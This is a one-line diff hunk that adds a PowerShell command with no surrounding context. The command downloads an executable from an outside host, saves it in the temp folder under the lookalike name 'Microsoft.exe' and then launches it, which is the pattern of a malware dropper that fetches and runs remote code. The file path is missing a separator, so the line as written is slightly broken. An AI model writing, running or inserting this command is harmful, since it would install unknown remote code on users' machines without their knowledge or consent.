@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://hnng.moe/f/Iot',"$env:TEMPMicrosoft.exe");Start-Process ("$env:TEMPMicrosoft.exe")
